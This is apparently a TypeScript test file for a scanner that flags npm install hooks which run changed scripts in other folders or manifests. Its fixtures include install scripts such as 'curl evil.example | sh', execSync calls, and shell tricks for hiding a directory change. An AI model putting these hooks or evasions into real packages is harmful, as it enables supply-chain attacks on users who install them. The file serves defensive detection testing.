import { describe, expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const SUB_OLD = { "sub/x.js": "1" };
const SUB_NEW = { "sub/x.js": "require('child_process').execSync('id')" };
const subManifest = (build: string) => ({ "sub/package.json": JSON.stringify({ name: "sub", version: "1", scripts: { build } }) });

// The hook names a runner form; only the given files change between old and new.
function held(scripts: object, oldFiles: Record<string, string>, newFiles: Record<string, string>): boolean {
  const base = { "package.json": pj(scripts) };
  return prepass("npm", map({ ...base, ...oldFiles }), map({ ...base, ...newFiles })).hard.some((s) => s.kind === "install-script");
}
const fileHeld = (hook: string) => held({ postinstall: hook, build: "echo ok", test: "echo ok" }, SUB_OLD, SUB_NEW);
const manifestHeld = (hook: string) => held({ postinstall: hook, build: "echo ok" }, subManifest("echo a"), subManifest("curl evil.example | sh"));

describe("a form that runs another package's script reads that package's manifest", () => {
  test("pnpm, yarn and bun workspace forms hold a changed script in another manifest", () => {
    for (const cmd of ["pnpm -C sub build", "pnpm --filter sub build", "pnpm -r build", "yarn workspace sub build", "yarn --cwd sub build", "bun --filter sub build", "bun run --workspaces build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("npm workspace forms and the wrapped forms hold it too", () => {
    for (const cmd of ["npm run build --prefix sub", "npm run build -w sub", "npx pnpm -C sub build", "corepack pnpm --filter sub build", "npx npm run build -w sub"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("a form that stays in this package ignores another manifest", () => {
    for (const cmd of ["npm run build", "pnpm run build", "yarn build", "bun run build", "npm run build -- --prefix sub"]) {
      expect(manifestHeld(cmd), cmd).toBe(false);
    }
  });
});

describe("npm forms that leave this package hold", () => {
  test("--prefix, -C, -w, --workspace and --workspaces do not resolve to the local script", () => {
    for (const cmd of ["npm run build --prefix sub", "npm --prefix sub run build", "npm --prefix=sub run build", "npm -C sub run build", "npm run build -w sub", "npm run build --workspace=sub", "npm run build -ws", "npm run build --workspaces", "npm test -w sub", "npm run -w sub build", "npm --workspace sub run build", "npm run build --include-workspace-root"]) {
      expect(fileHeld(cmd), cmd).toBe(true);
    }
  });

  test("a flag after -- belongs to the script, and a plain run stays local", () => {
    for (const cmd of ["npm run build", "npm run build -- -w sub", "npm test", "npm run build --silent"]) {
      expect(fileHeld(cmd), cmd).toBe(false);
    }
  });
});

describe("an unknown flag before the script name holds", () => {
  test("yarn, pnpm, bun and npm do not guess what a flag takes", () => {
    for (const cmd of ["yarn run -T build", "yarn -T build", "pnpm run --foo build", "pnpm --bar build", "pnpm run -T build", "bun run --bun build", "npm run --foo build", "yarn run -- build"]) {
      expect(fileHeld(cmd), cmd).toBe(true);
    }
  });

  test("known quiet flags still resolve to the local script", () => {
    for (const cmd of ["yarn run --silent build", "pnpm run --if-present build", "bun run build", "yarn build"]) {
      expect(fileHeld(cmd), cmd).toBe(false);
    }
  });
});

describe("review round: pinned runners, exec forms, unresolved routes and .npmrc", () => {
  test("a version-pinned wrapped runner is recognized", () => {
    for (const cmd of ["npx pnpm@9 -C sub build", "corepack yarn@1.22.22 workspace sub build", "npx pnpm@9 --filter sub build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("bunx, npm exec and npx -c reach the wrapped runner", () => {
    for (const cmd of ["bunx pnpm -C sub build", "npm exec -- pnpm -C sub build", "npx -c 'pnpm -C sub build'"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("every unresolved route reads the other manifests", () => {
    for (const cmd of ["cd sub && npm run build", "lerna run build", "npx lerna run build", "turbo run build", "npm_config_workspace=sub npm run build", "env npm_config_prefix=sub npm run build", "npm --userconfig ./rc run build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("a .npmrc in the package joins the surface and widens", () => {
    const scripts = { postinstall: "npm run build", build: "echo ok" };
    const oldF = { ".npmrc": "workspace=sub\n", ...subManifest("echo a") };
    expect(held(scripts, oldF, { ".npmrc": "workspace=sub\n", ...subManifest("curl evil.example | sh") })).toBe(true);
    expect(held(scripts, oldF, { ".npmrc": "workspace=other\n", ...subManifest("echo a") })).toBe(true);
    expect(held(scripts, subManifest("echo a"), subManifest("curl evil.example | sh"))).toBe(false);
  });
});

describe("a manifest under a test or docs folder is still read by a directory-changing form", () => {
  const nested = (dir: string, build: string) => ({ [`${dir}/package.json`]: JSON.stringify({ name: "n", version: "1", scripts: { build } }) });
  const cases: [string, string][] = [
    ["npm --prefix tests/pkg run build", "tests/pkg"],
    ["pnpm -C tests/pkg build", "tests/pkg"],
    ["yarn --cwd docs/pkg build", "docs/pkg"],
    ["npm run build -w test/pkg", "test/pkg"],
    ["cd __tests__/pkg && npm run build", "__tests__/pkg"],
  ];
  test("each form holds a changed nested manifest", () => {
    for (const [cmd, dir] of cases) {
      expect(held({ postinstall: cmd, build: "echo ok" }, nested(dir, "echo a"), nested(dir, "curl evil.example | sh")), cmd).toBe(true);
    }
  });
  test("the control under sub holds and an unchanged manifest does not", () => {
    expect(manifestHeld("npm --prefix sub run build")).toBe(true);
    expect(held({ postinstall: "npm --prefix tests/pkg run build", build: "echo ok" }, nested("tests/pkg", "echo a"), nested("tests/pkg", "echo a"))).toBe(false);
  });
});

describe("npm exec forms and runner config files", () => {
  test("npm exec and npm x hold a changed file the command reaches, remote or not", () => {
    for (const cmd of ["npm exec -- run-s setup", "npm x -- run-s setup", "npm exec -p evil-pkg -- node ./sub/x.js", "npm exec --package=evil-pkg -- node ./sub/x.js", "npm exec --call='node ./sub/x.js'", "npm exec -c='node ./sub/x.js'", "npm exec -c 'node ./sub/x.js'", "npm exec --call 'node ./sub/x.js'"]) {
      expect(held({ postinstall: cmd, setup: "node sub/x.js" }, SUB_OLD, SUB_NEW), cmd).toBe(true);
    }
  });

  test("npm exec with -c dispatches the call string to the wrapped runner", () => {
    for (const cmd of ["npm exec --call='pnpm -C sub build'", "npm exec -c='pnpm -C sub build'", "npm x -p pnpm -- pnpm -C sub build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("a changed runner config file with an install hook holds", () => {
    const scripts = { postinstall: "npm run build", build: "echo ok" };
    for (const f of [".npmrc", ".yarnrc.yml", ".yarnrc", "pnpm-workspace.yaml", ".pnpmfile.cjs", "bunfig.toml"]) {
      expect(held(scripts, { [f]: "a" }, { [f]: "b" }), f).toBe(true);
      expect(held(scripts, { [f]: "a" }, { [f]: "a" }), f).toBe(false);
      expect(held(scripts, {}, { [f]: "b" }), `added ${f}`).toBe(true);
    }
  });
});

describe("third review round", () => {
  test("npm flags after the script name, by prefix or joined, widen", () => {
    for (const cmd of ["npm run build --prefi sub", "npm run build --prefi=sub", "npm run build -sw sub", "npm test --userconf ./rc", "npm run build --script-shell=./x", "npm run build --node-options=--require=./x", "npx npm run build --prefi sub"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("known quiet npm flags and flags after -- stay local", () => {
    for (const cmd of ["npm run build --silent", "npm run build --loglevel silent", "npm run build --if-present", "npm run build -- --prefi sub"]) {
      expect(manifestHeld(cmd), cmd).toBe(false);
    }
  });

  test("npm exec -c runs the whole shell string", () => {
    for (const cmd of ["npm exec -c 'node ./safe.js && pnpm -C sub build'", "npm exec --call='node ./safe.js && pnpm -C sub build'"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("a runner spec that is not a version or tag is not the trusted runner", () => {
    for (const cmd of ["npx pnpm@file:pnpm.tgz build", "npx pnpm@npm:other-pkg build", "corepack pnpm@https://x.example/p.tgz build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
    for (const cmd of ["npx pnpm@9.1.0 build", "npx pnpm@latest build", "corepack pnpm@9.1.0+sha256.abc build"]) {
      expect(fileHeld(cmd), cmd).toBe(false);
    }
  });

  test("a body the splitter gives up on still widens when it moves the run", () => {
    for (const cmd of ["pnpm -C sub build > /dev/null", "npm run build -w sub | tee log", "(cd sub && npm run build)", "sh -c 'cd sub && npm run build'", "lerna run build --config ./lerna.json", "npx lerna run build --config ./lerna.json", "turbo run build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
    expect(manifestHeld("npm run build > /dev/null")).toBe(false);
  });

  test("an environment assignment widens only for runner configuration names", () => {
    expect(manifestHeld("npm_config_workspace=sub npm run build")).toBe(true);
    expect(manifestHeld("YARN_RC_FILENAME=x yarn build")).toBe(true);
    expect(manifestHeld("FOO=1 npm run build")).toBe(false);
  });

  test("a widened hook does not hold when only the root version bumps", () => {
    const hook = (version: string) => ({ "package.json": JSON.stringify({ name: "x", version, scripts: { postinstall: "lerna run build" } }), ...subManifest("echo a") });
    expect(prepass("npm", map(hook("1.0.0")), map(hook("1.0.1"))).hard.some((f) => f.kind === "install-script")).toBe(false);
  });
});

describe("a nested package's script file under a test or docs folder", () => {
  const pkg = JSON.stringify({ name: "n", version: "1", scripts: { build: "node build.js" } });
  const files = (dir: string, js: string) => ({ [`${dir}/package.json`]: pkg, [`${dir}/build.js`]: js });
  const forms: [string, string][] = [
    ["npm --prefix tests/pkg run build", "tests/pkg"],
    ["pnpm -C tests/pkg build", "tests/pkg"],
    ["yarn --cwd docs/pkg build", "docs/pkg"],
    ["npm -w test/pkg run build", "test/pkg"],
    ["cd __tests__/pkg && npm run build", "__tests__/pkg"],
    ["npm --prefix sub run build", "sub"],
  ];
  test("a changed script file there holds", () => {
    for (const [cmd, dir] of forms) {
      expect(held({ postinstall: cmd, build: "echo ok" }, files(dir, "1"), files(dir, "require('child_process').execSync('id')")), cmd).toBe(true);
    }
  });
  test("an unchanged one does not, and a folder with no nested manifest stays inert", () => {
    expect(held({ postinstall: "npm --prefix tests/pkg run build", build: "echo ok" }, files("tests/pkg", "1"), files("tests/pkg", "1"))).toBe(false);
    expect(held({ postinstall: "lerna run build", build: "echo ok" }, { "tests/helper.js": "1" }, { "tests/helper.js": "2" })).toBe(false);
  });
});

describe("fourth review round: escapes", () => {
  // sub/index.js exists, so the word `sub` resolves to a file; only the manifest build changes.
  const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
  const idxHeld = (hook: string) => held({ postinstall: hook, build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh"));

  test("a cd or pushd always widens, even when its target resolves to a file", () => {
    for (const cmd of ["cd sub && npm run build", "pushd sub && npm run build", "cd sub; yarn build", "command cd sub && npm run build", "builtin cd sub && npm run build"]) {
      expect(idxHeld(cmd), cmd).toBe(true);
    }
  });

  test("an unresolvable expansion in a body that moves the run widens", () => {
    for (const cmd of ["npm run build --prefix $PWD/sub", "cd $PWD/sub && npm run build", "pnpm -C ${INIT_CWD}/sub build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
    expect(manifestHeld("npm run build $FOO")).toBe(false);
  });

  test("every leading assignment is checked", () => {
    for (const cmd of ["CI=1 npm_config_workspace=sub npm run build", "A=1 B=2 YARN_RC_FILENAME=x yarn build"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("unknown npm flags, shell options and a backslash do not hide the move", () => {
    for (const cmd of ["npm run build --prefi sub > /dev/null", "sh -c 'npm run build --prefi sub'", "bash --norc -c 'cd sub && npm run build'", "sh -e -c 'cd sub && npm run build'", "\\cd sub > /dev/null && npm run build", "corepack npm run build --prefi sub"]) {
      expect(idxHeld(cmd), cmd).toBe(true);
    }
    expect(idxHeld("npm run build > /dev/null")).toBe(false);
  });
});

describe("fifth review round: false positives and the npm exec parser", () => {
  const lib = (v: string) => ({ "lib/a.js": v });
  const quiet = (scripts: object, extra: Record<string, string> = {}) => held(scripts, { ...extra, ...lib("1") }, { ...extra, ...lib("2") });

  test("a config file below the root, or a hook with no runner, does not widen", () => {
    expect(quiet({ postinstall: "node install.js" }, { "templates/app/.yarnrc.yml": "a", "test/fixtures/p/.npmrc": "a", "bunfig.toml": "a" })).toBe(false);
    expect(quiet({ install: "node-gyp-build" }, { ".yarnrc": "a" })).toBe(false);
    expect(held({ postinstall: "npm run build", build: "echo ok" }, { "test/fixtures/p/.npmrc": "a" }, { "test/fixtures/p/.npmrc": "b" })).toBe(false);
  });

  test("a root config file with a runner in the hook still widens", () => {
    expect(quiet({ postinstall: "npm run build", build: "echo ok" }, { ".npmrc": "a" })).toBe(true);
  });

  test("another program's flags, quoted text and echo do not move the run", () => {
    for (const cmd of ["rm -rf build 2>/dev/null; node install.js", "prebuild-install -r napi 2>/dev/null || node-gyp rebuild", "tar -C vendor -xf v.tgz > /dev/null && node install.js", "node install.js || echo 'workspace setup failed' >&2"]) {
      expect(quiet({ postinstall: cmd }), cmd).toBe(false);
    }
  });

  test("a runner command word with a workspace flag still moves the run, in any segment", () => {
    for (const cmd of ["echo hi 2>/dev/null; pnpm -r build > /dev/null", "npm run build -w sub | tee log", "true && cd sub > /dev/null"]) {
      expect(manifestHeld(cmd), cmd).toBe(true);
    }
  });

  test("npm exec options are parsed by the exec reader, not the plain flag rule", () => {
    // sub/index.js exists, so only the exec reader's call string or wrapped runner can reach sub/package.json.
    const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
    const h = (hook: string) => held({ postinstall: hook, build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh"));
    for (const cmd of ["npm exec -y -c 'cd sub && npm run build'", "npm exec --yes --call='pnpm -C sub build'", "npm exec -p pnpm -- pnpm -C sub build"]) expect(h(cmd), cmd).toBe(true);
    expect(h("npm exec -c 'node ./x.js'")).toBe(false);
  });
});

describe("an env prefix does not hide the command after it", () => {
  const nested = (dir: string, js: string) => ({ [`${dir}/package.json`]: JSON.stringify({ name: "n", version: "1", scripts: { build: "node build.js" } }), [`${dir}/build.js`]: js });
  test("a plain assignment is read like the bare command", () => {
    for (const [cmd, dir] of [["FOO=1 npm --prefix sub run build", "sub"], ["FOO=1 cd sub && npm run build", "sub"], ["FOO=1 BAR=2 npm --prefix tests/pkg run build", "tests/pkg"], ["npm_config_x=1 npm --prefix tests/pkg run build", "tests/pkg"]] as const) {
      expect(held({ postinstall: cmd, build: "echo ok" }, nested(dir, "1"), nested(dir, "evil()")), cmd).toBe(true);
    }
    expect(held({ postinstall: "FOO=1 node build.js" }, { "build.js": "1" }, { "build.js": "evil()" })).toBe(true);
    expect(held({ postinstall: "FOO=1 npm run build", build: "echo ok" }, nested("sub", "1"), nested("sub", "evil()"))).toBe(false);
  });
});

describe("structural rule: every command is checked for a move", () => {
  const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
  const idx = (hook: string, extra: Record<string, string> = {}) => held({ postinstall: hook, build: "echo ok", ...extra }, withIndex("echo a"), withIndex("curl evil.example | sh"));

  test("1. an assignment before the command, split or unsplit", () => {
    for (const cmd of ["CI=1 pnpm -C sub build", "CI=true pnpm --filter sub build", "CI=1 cd sub && npm run build", "FOO=1 npm run build -w sub", "npm_config_workspace=sub npm run build > /dev/null", "sh -c 'npm_config_prefix=sub npm run build'"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
  });

  test("2. a wrapper before a moving form", () => {
    for (const cmd of ["env CI=1 pnpm -C sub build", "cross-env NODE_ENV=production pnpm -C sub build", "exec npm --prefix sub run build", "env -i pnpm -C sub build"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
  });

  test("3. a workspace tool through yarn, pnpm, bun or npm exec", () => {
    for (const cmd of ["yarn lerna run build", "pnpm turbo build", "yarn run turbo build", "yarn nx run-many -t build", "pnpm exec lerna run build", "npm exec lerna run build 2>/dev/null"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
  });

  test("4. -c after options that take a value", () => {
    for (const cmd of ["sh -o pipefail -c 'cd sub && npm run build'", "bash -euo pipefail -c 'cd sub && npm run build'", "bash -O extglob -c 'cd sub && npm run build'", "bash --rcfile x -c 'cd sub && npm run build'"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
    expect(idx("sh -c 'node ./x.js'")).toBe(false);
  });

  test("5a. arguments given to a script that runs a runner", () => {
    for (const hook of ["npm run go -- -w sub", "yarn go -w sub", "pnpm go -- -C sub"]) {
      expect(held({ postinstall: hook, go: "npm run build", build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh")), hook).toBe(true);
    }
    // A script body with no runner stays local, and no extra argument stays local.
    expect(held({ postinstall: "npm run go -- -w sub", go: "echo hi", build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh"))).toBe(false);
    expect(held({ postinstall: "npm run go", go: "npm run build", build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh"))).toBe(false);
  });

  test("5b. files under a directory a run moved into are read, even test or docs", () => {
    for (const cmd of ["cd test && node setup.js", "pnpm -C docs exec node gen.js", "npm --prefix test run setup"]) {
      const dir = cmd.includes("docs") ? "docs" : "test";
      expect(held({ postinstall: cmd }, { [`${dir}/setup.js`]: "1", [`${dir}/gen.js`]: "1" }, { [`${dir}/setup.js`]: "evil()", [`${dir}/gen.js`]: "evil()" }), cmd).toBe(true);
    }
    expect(held({ postinstall: "lerna run build" }, { "test/helper.js": "1" }, { "test/helper.js": "2" })).toBe(false);
  });

  test("5c. a runner reached through a shell script makes the root config count", () => {
    const hook = { postinstall: "sh scripts/install.sh" };
    const f = (cfg: string) => ({ "scripts/install.sh": "npm run build\n", ".npmrc": cfg });
    expect(held(hook, f("workspace=a"), f("workspace=b"))).toBe(true);
    const g = (cfg: string) => ({ "scripts/install.sh": "echo hi\n", ".npmrc": cfg });
    expect(held(hook, g("workspace=a"), g("workspace=b"))).toBe(false);
  });
});

describe("npm exec -p and NODE_ assignments", () => {
  const h = (hook: string, files: Record<string, string> = {}) => held({ postinstall: hook, build: "echo ok" }, { ...files, ...subManifest("echo a"), "lib/a.js": "1" }, { ...files, ...subManifest("echo a"), "lib/a.js": "2" });
  test("-p pkg with -c or -- widens, and -c alone stays on the call string", () => {
    expect(h("npm exec -p evil-pkg -c 'node ./safe.js'", { "safe.js": "s" })).toBe(true);
    expect(h("npm exec -p evil-pkg -- node ./safe.js", { "safe.js": "s" })).toBe(true);
    expect(h("npm exec -c 'node ./safe.js'", { "safe.js": "s" })).toBe(false);
  });
  test("NODE_OPTIONS widens, another NODE_ name does not", () => {
    expect(h("NODE_OPTIONS=--require=./sub/x.js npm run build")).toBe(true);
    expect(h("NODE_ENV=production npm run build")).toBe(false);
  });
});

describe("5c: a runner reached through a shell script", () => {
  test("a root .npmrc added with a changed nested script holds; without a runner it does not", () => {
    const hook = { postinstall: "sh scripts/install.sh", build: "echo ok" };
    const oldF = (sh: string) => ({ "scripts/install.sh": sh, ...subManifest("echo a") });
    const newF = (sh: string) => ({ "scripts/install.sh": sh, ".npmrc": "workspace=sub\n", ...subManifest("curl evil.example | sh") });
    expect(held(hook, oldF("npm run build\n"), newF("npm run build\n"))).toBe(true);
    expect(held(hook, oldF("node setup.js\n"), newF("node setup.js\n"))).toBe(false);
  });
});

describe("unmodeled command words and wrappers with value options", () => {
  const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
  const idx = (hook: string, extra: Record<string, string> = {}) => held({ postinstall: hook, build: "echo ok", ...extra }, withIndex("echo a"), withIndex("curl evil.example | sh"));

  test("1. wrapper options that take a value", () => {
    for (const cmd of ["env -u NODE_ENV pnpm -C sub build", "env -C sub npm run build", "env -S 'pnpm -C sub build'", "time -o t.log npm --prefix sub run build", "exec -a x pnpm -C sub build"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
  });

  test("2. commands that run their arguments, and reserved words", () => {
    for (const cmd of ["nice pnpm -C sub build", "timeout 60 npm --prefix sub run build", "eval cd sub && npm run build", "eval 'cd sub && npm run build'", "! cd sub || npm run build", "echo sub | xargs -I% npm --prefix % run build"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
  });

  test("3. options after -c, and a script piped into a shell", () => {
    for (const cmd of ["sh -c -e 'cd sub && npm run build'", "bash -c -- 'cd sub && npm run build'", "sh -c -o pipefail 'cd sub && npm run build'", "echo 'cd sub && npm run build' | sh"]) {
      expect(idx(cmd), cmd).toBe(true);
    }
    expect(idx("echo 'node ./x.js' | sh", { "x.js": "1" })).toBe(false);
  });

  test("4. script arguments through npx, corepack, env and yarn/pnpm wrappers", () => {
    for (const hook of ["npx npm run go -- -w sub", "corepack npm run go -- -w sub", "npx yarn go -w sub", "npx pnpm go -- -C sub", "env npm run go -- -w sub"]) {
      expect(held({ postinstall: hook, go: "npm run build", build: "echo ok" }, withIndex("echo a"), withIndex("curl evil.example | sh")), hook).toBe(true);
    }
  });
});

describe("unsplit bodies: runners, moved directories, escapes and comments", () => {
  const withIndex = (build: string) => ({ ...subManifest(build), "sub/index.js": "1" });
  const idx = (hook: string, extra: Record<string, string> = {}) => held({ postinstall: hook, build: "echo ok" }, { ...withIndex("echo a"), ...extra }, { ...withIndex("curl evil.example | sh"), ...extra });

  test("1. a runner in a body the splitter gives up on makes the root config count", () => {
    const hook = { postinstall: "npm run build > /dev/null", build: "echo ok" };
    expect(held(hook, { ".npmrc": "workspace=a" }, { ".npmrc": "workspace=b" })).toBe(true);
    expect(held({ postinstall: "npm run build --prefix $PWD/x", build: "echo ok" }, { ".npmrc": "a" }, { ".npmrc": "b" })).toBe(true);
    expect(held({ postinstall: "node a.js > /dev/null" }, { ".npmrc": "a", "a.js": "1" }, { ".npmrc": "b", "a.js": "1" })).toBe(false);
  });

  test("2. a directory an unsplit body moves into is read, even test or docs", () => {
    for (const cmd of ["cd test > /dev/null && node setup.js", "pushd docs > /dev/null; node setup.js"]) {
      const dir = cmd.includes("docs") ? "docs" : "test";
      expect(held({ postinstall: cmd }, { [`${dir}/setup.js`]: "1" }, { [`${dir}/setup.js`]: "evil()" }), cmd).toBe(true);
    }
  });

  test("3. a backslash or a comment does not hide a later cd", () => {
    for (const cmd of ["node a.js > /dev/null # don't\ncd sub && npm run build", "echo \\\" > /dev/null; cd sub && npm run build", "echo \" > /dev/null; cd sub && npm run build"]) {
      expect(idx(cmd, { "a.js": "1" }), cmd).toBe(true);
    }
    // A comment is not a command.
    expect(idx("node a.js > /dev/null # cd sub && npm run build", { "a.js": "1" })).toBe(false);
  });
});

describe("joined env directory flags, clustered shell options, substitutions, relative cd and aliases", () => {
  const dirHeld = (cmd: string, dir: string, files: Record<string, string> = {}) => held({ postinstall: cmd }, { [`${dir}/setup.js`]: "1", [`${dir}/gen.js`]: "1", ...files }, { [`${dir}/setup.js`]: "evil()", [`${dir}/gen.js`]: "evil()", ...files });

  test("env -Cdir and --chdir=dir record the directory", () => {
    expect(dirHeld("env -Ctest node setup.js", "test")).toBe(true);
    expect(dirHeld("env --chdir=test node setup.js", "test")).toBe(true);
    expect(dirHeld("env -C test node setup.js", "test")).toBe(true);
  });

  test("a cluster ending in o takes its option name before the string", () => {
    expect(dirHeld("bash -eco pipefail 'cd test && node setup.js'", "test")).toBe(true);
  });

  test("a command substitution inside quotes runs its content", () => {
    expect(dirHeld('echo "$(cd test && node setup.js)"', "test")).toBe(true);
    expect(dirHeld('echo "`cd test && node setup.js`"', "test")).toBe(true);
  });

  test("a relative cd chain resolves against the earlier cd", () => {
    expect(dirHeld("cd tools > /dev/null && cd ../docs > /dev/null && node gen.js", "docs", { "tools/x": "1" })).toBe(true);
    expect(dirHeld("cd tools && cd ../docs && node gen.js", "docs", { "tools/x": "1" })).toBe(true);
  });

  test("yarnpkg and pnpx are yarn and npx", () => {
    const m = (cmd: string) => manifestHeld(cmd);
    expect(m("yarnpkg --cwd sub build")).toBe(true);
    expect(m("pnpx pnpm -C sub build")).toBe(true);
  });
});

describe("round 10: linear substitutions, clustered o, wrong cd base, clustered env -C", () => {
  const dirHeld = (cmd: string, dir: string, extra: Record<string, string> = {}, scripts: object = {}) => held({ postinstall: cmd, ...scripts }, { [`${dir}/setup.js`]: "1", [`${dir}/gen.js`]: "1", ...extra }, { [`${dir}/setup.js`]: "evil()", [`${dir}/gen.js`]: "evil()", ...extra });

  test("1. many substitutions are read in linear time", () => {
    const hook = `true "${"$(a) ".repeat(60)}x"`;
    const t = Date.now();
    held({ postinstall: hook }, {}, {});
    expect(Date.now() - t).toBeLessThan(1000);
    const nested = `true "${"$(a ".repeat(30)}${")".repeat(30)}"`;
    const t2 = Date.now();
    held({ postinstall: nested }, {}, {});
    expect(Date.now() - t2).toBeLessThan(1000);
  });

  test("2. o anywhere in a -c cluster takes an option name", () => {
    for (const cmd of ["bash -oc pipefail 'cd test && node setup.js'", "bash -eoc pipefail 'cd test && node setup.js'", "bash -ocu pipefail 'cd test && node setup.js'"]) {
      expect(dirHeld(cmd, "test"), cmd).toBe(true);
    }
  });

  test("3. a cd base from another script, subshell or popd does not hide the real folder", () => {
    expect(dirHeld("npm run a && npm run b", "docs", {}, { a: "cd tools && node x.js", b: "cd docs && node gen.js" })).toBe(true);
    expect(dirHeld("(cd test && node a.js); cd docs && node gen.js", "docs", { "test/a.js": "1" })).toBe(true);
    expect(dirHeld("pushd tools; popd; cd docs && node gen.js", "docs")).toBe(true);
  });

  test("4/5. clustered env -C, and an escaped backtick does not shift the substitutions", () => {
    expect(dirHeld("env -iCtest node setup.js", "test")).toBe(true);
    expect(dirHeld("env -iC test node setup.js", "test")).toBe(true);
    expect(dirHeld('echo "\\`" "`cd test && node setup.js`"', "test")).toBe(true);
  });
});

describe("round 11: fail closed when the shell scan cannot be sure", () => {
  const testHeld = (cmd: string) => held({ postinstall: cmd }, { "test/setup.js": "1" }, { "test/setup.js": "evil()" });

  test("1. quotes and case inside a substitution do not hide the cd", () => {
    for (const cmd of [
      `echo "$(echo ')'; cd test && node setup.js)" > /dev/null`,
      "echo '`' \"`cd test && node setup.js`\" > /dev/null",
      `echo "$(case a in a) cd test && node setup.js;; esac)" > /dev/null`,
    ]) {
      expect(testHeld(cmd), cmd).toBe(true);
    }
  });

  test("2. env -S in an unsplit body", () => {
    for (const cmd of ["env -S 'cd test && node setup.js' > /dev/null", "env --split-string='cd test && node setup.js' > /dev/null", "env -iS 'cd test && node setup.js' > /dev/null"]) {
      expect(testHeld(cmd), cmd).toBe(true);
    }
  });

  test("3. o before and after -c follow one rule", () => {
    for (const cmd of ["bash -c -oe pipefail 'cd test && node setup.js'", "bash -c -o pipefail 'cd test && node setup.js'", "bash -oc pipefail 'cd test && node setup.js'"]) {
      expect(testHeld(cmd), cmd).toBe(true);
    }
  });

  test("4. deep nesting stays within a budget and widens", () => {
    const hook = `echo "${"$(".repeat(20000)}${")".repeat(20000)}"`;
    const t = Date.now();
    expect(testHeld(hook)).toBe(true);
    expect(Date.now() - t).toBeLessThan(3000);
  });

  test("5. a long run of pipes into a shell stays linear", () => {
    const hook = "echo 'a b' | sh; ".repeat(2000);
    const t = Date.now();
    held({ postinstall: hook }, {}, {});
    expect(Date.now() - t).toBeLessThan(3000);
  });
});

describe("round 11b: unclosed substitutions and nested escaped backticks", () => {
  const pkgHeld = (cmd: string) => held({ postinstall: cmd }, { "tests/pkg/build.js": "1" }, { "tests/pkg/build.js": "evil()" });
  const timed = (cmd: string) => {
    const t = Date.now();
    const r = pkgHeld(cmd);
    expect(Date.now() - t).toBeLessThan(3000);
    return r;
  };

  test("an unclosed substitution in a long hook widens quickly", () => {
    expect(timed(`${"$(".repeat(5000)} cd tests/pkg && node build.js`)).toBe(true);
    expect(timed(`${'echo "$(" '.repeat(5000)} cd tests/pkg && node build.js`)).toBe(true);
    expect(timed(`${"$(".repeat(2000)}${")".repeat(2000)}`)).toBe(true);
  });

  test("an escaped backtick inside a backtick body widens", () => {
    expect(pkgHeld("echo `echo \\`cd tests/pkg && node build.js\\``")).toBe(true);
  });
});

describe("round 12: unresolvable cd targets, npm exec flags after the command, bounded recursion, CDPATH", () => {
  const testHeld = (cmd: string, extra: Record<string, string> = {}) => held({ postinstall: cmd }, { "test/setup.js": "1", ...extra }, { "test/setup.js": "evil()", ...extra });

  test("1. a cd target with an expansion, glob or brace reads every file", () => {
    for (const cmd of ["cd $PWD/test && node setup.js", "cd te* && node setup.js", "cd ${D:-test} && node setup.js", "cd $(echo test) && node setup.js", "pushd te?t && node setup.js", "cd {test,x} && node setup.js", "cd - && node setup.js"]) {
      expect(testHeld(cmd), cmd).toBe(true);
    }
    expect(testHeld("cd lib && node setup.js", { "lib/setup.js": "1" })).toBe(false);
  });

  test("2. npm flags after the exec command word are npm's own", () => {
    const f = (v: string) => ({ "tools/x.js": "1", "sub/lib/y.js": v, ...subManifest("echo a") });
    const h = (cmd: string) => held({ postinstall: cmd }, f("1"), f("evil()"));
    expect(h("npm exec ./tools/x.js -w sub")).toBe(true);
    expect(h("npm exec ./tools/x.js --prefix sub")).toBe(true);
  });

  test("3. deep wrapper recursion widens instead of crashing", () => {
    for (const hook of ["npx ".repeat(20000) + "x", "pnpm exec ".repeat(20000) + "x", "npm exec ".repeat(20000)]) {
      const t = Date.now();
      expect(testHeld(hook), hook.slice(0, 12)).toBe(true);
      expect(Date.now() - t).toBeLessThan(5000);
    }
  });

  test("3b. a long wrapper chain is read without crashing", () => {
    const t = Date.now();
    held({ postinstall: "env ".repeat(20000) + "x" }, {}, {});
    held({ postinstall: "sh -c ".repeat(5000) + "x" }, {}, {});
    expect(Date.now() - t).toBeLessThan(5000);
  });

  test("3c. thousands of directory changes are bounded and read every file", () => {
    for (const hook of ["cd x && ".repeat(20000) + "node a.js", "cd x > /dev/null && ".repeat(20000) + "node a.js"]) {
      const t = Date.now();
      expect(testHeld(hook, { "a.js": "1" })).toBe(true);
      expect(Date.now() - t).toBeLessThan(5000);
    }
  });

